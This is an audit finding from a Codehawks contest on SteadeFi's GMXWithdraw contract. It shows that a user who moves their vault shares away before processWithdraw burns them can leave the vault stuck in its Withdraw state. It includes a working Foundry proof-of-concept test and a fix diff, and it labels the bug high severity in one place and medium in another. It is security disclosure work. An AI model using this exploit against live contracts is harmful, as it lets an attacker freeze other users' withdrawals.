---
# Core Classification
protocol: SteadeFi
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 27633
audit_firm: Codehawks
contest_link: https://www.codehawks.com/contests/clo38mm260001la08daw5cbuf
source_link: none
github_link: https://github.com/Cyfrin/2023-10-SteadeFi

# Impact Classification
severity: high
impact: security_vulnerability
exploitability: 0.00
financial_impact: high

# Scoring
quality_score: 0
rarity_score: 1

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 1
finders:
  - TheSchnilch
---

## Vulnerability Title

User can revert processWithdraw

### Overview


This bug report is about the processWithdraw function in GMXWithdraw.sol, a Solidity file in the 2023-10-SteadeFi GitHub repository. The function is used when a user wants to withdraw their tokens after depositing them. The bug is that a user can transfer their Vault Shares away before the burn is executed, causing the processWithdraw to revert. This would result in the Vault being stuck in the 'Withdraw' state, as calling the function again would also result in a revert. 

A proof-of-concept (POC) was provided with the report, which can be started with the command `forge test --match-test test_POC4 -vv`. This POC demonstrates how a user can cause the processWithdraw to revert. The impact of this is that the Vault would be stuck in the 'Withdraw' state, and the user's Vault Shares would not be burned. The only way to exit this state is through 'emergencyPause' and 'emergencyResume', which can only be called by the owner, who is a Multisig with a Timelock.

The tools used for this bug report were VSCode and Foundry. The recommendation to fix this bug is to burn the tokens immediately after remove liquidity is called in GMXWithdraw.sol:

```diff
+ 154: self.vault.burn(self.withdrawCache.user, self.withdrawCache.withdrawParams.shareAmt);
- 197: self.vault.burn(self.withdrawCache.user, self.withdrawCache.withdrawParams.shareAmt);
```

This bug report is of medium risk.

### Original Finding Content

### Relevant GitHub Links
<a data-meta="codehawks-github-link" href="https://github.com/Cyfrin/2023-10-SteadeFi/blob/0f909e2f0917cb9ad02986f631d622376510abec/contracts/strategy/gmx/GMXWithdraw.sol#L197">https://github.com/Cyfrin/2023-10-SteadeFi/blob/0f909e2f0917cb9ad02986f631d622376510abec/contracts/strategy/gmx/GMXWithdraw.sol#L197</a>


## Summary

When a user wants to withdraw his tokens after depositing, the LP tokens are first sent to GMX. GMX then sends back the deposited tokens. Before the user receives them, their Vault Shares are burned in processWithdraw:

```solidity
File: GMXWithdraw.sol#processWithdraw
197: self.vault.burn(self.withdrawCache.user, self.withdrawCache.withdrawParams.shareAmt);
```

A user could, after the LP tokens have been transferred to GMX and the Vault is waiting for the callback, transfer his Vault Shares away from his address. This would result in not having enough tokens left during the burn, causing a revert. Afterward, the Vault would be stuck in the 'Withdraw' state because, although the keeper could call the function again, it would result in revert again.

## Vulnerability Details

Here is a POC that demonstrates how a user can cause the processWithdraw to revert:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;
import { console, console2 } from "forge-std/Test.sol";
import { TestUtils } from "../../helpers/TestUtils.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { IERC20Errors } from "@openzeppelin/contracts/interfaces/draft-IERC6093.sol";
import { GMXMockVaultSetup } from "./GMXMockVaultSetup.t.sol";
import { GMXTypes } from "../../../contracts/strategy/gmx/GMXTypes.sol";
import { GMXTestHelper } from "./GMXTestHelper.sol";

import { IDeposit } from "../../../contracts/interfaces/protocols/gmx/IDeposit.sol";
import { IEvent } from "../../../contracts/interfaces/protocols/gmx/IEvent.sol";
import { Attacker } from "./Attacker.sol";

contract GMXDepositTest is GMXMockVaultSetup, GMXTestHelper, TestUtils {
    function test_POC4() public {
        //owner deposits
        vm.startPrank(address(owner));
        _createAndExecuteDeposit(address(WETH), address(USDC), address(WETH), 10 ether, 0, SLIPPAGE, EXECUTION_FEE);
        vm.stopPrank();

        //user1 deposits
        vm.startPrank(address(user1));
        _createAndExecuteDeposit(address(WETH), address(USDC), address(WETH), 10 ether, 0, SLIPPAGE, EXECUTION_FEE);
        vm.stopPrank();
        
        uint256 vaultSharesAmt = IERC20(address(vault)).balanceOf(address(user1)); //Vault Shares from user1 to withdraw
        vm.startPrank(address(user1));
        _createWithdrawal(address(USDC), vaultSharesAmt, 0, SLIPPAGE, EXECUTION_FEE); //User 1 creates a withdrawal
        IERC20(address(vault)).transfer(address(user2), vaultSharesAmt); //Before processWithdraw is executed and the user's Vault Shares are burned, he sends them away

        vm.expectRevert(
            abi.encodeWithSelector(IERC20Errors.ERC20InsufficientBalance.selector, address(user1), 0, vaultSharesAmt)
        );
        mockExchangeRouter.executeWithdrawal(address(WETH), address(USDC), address(vault), address(callback)); //executeWithdraw reverted as there are no tokens to burn
        vm.stopPrank();

        GMXTypes.Store memory _store = vault.store();
        assert(uint256(_store.status) == uint256(GMXTypes.Status.Withdraw)); //shows that the vault is still in the Withdraw status
    }
}
```

The POC can be started with this command: `forge test --match-test test_POC4 -vv`

## Impact

A user could put the Vault into a 'Stuck' state that can only be exited through 'emergencyPause' and 'emergencyResume.' This would take some time as 'emergencyResume' can only be called by the owner, who is a Multisig with a Timelock. (A keeper could also call 'processWithdrawCancellation,' but in this case, the debt to the lending vault would not be repaid. The tokens withdrawn by GMX would simply remain in the vault, and the user's Vault Shares would not be burned.)

## Tools Used

VSCode, Foundry

## Recommendations

Tokens should be burned immediately after remove liquidity is called in GMXWithdraw.sol:
```diff
+ 154: self.vault.burn(self.withdrawCache.user, self.withdrawCache.withdrawParams.shareAmt);
- 197: self.vault.burn(self.withdrawCache.user, self.withdrawCache.withdrawParams.shareAmt);
```

### Metadata

| Field | Value |
|-------|-------|
| Impact | HIGH |
| Quality Score | 0/5 |
| Rarity Score | 1/5 |
| Audit Firm | Codehawks |
| Protocol | SteadeFi |
| Report Date | N/A |
| Finders | TheSchnilch |

### Source Links

- **Source**: N/A
- **GitHub**: https://github.com/Cyfrin/2023-10-SteadeFi
- **Contest**: https://www.codehawks.com/contests/clo38mm260001la08daw5cbuf

### Keywords for Search

`vulnerability`

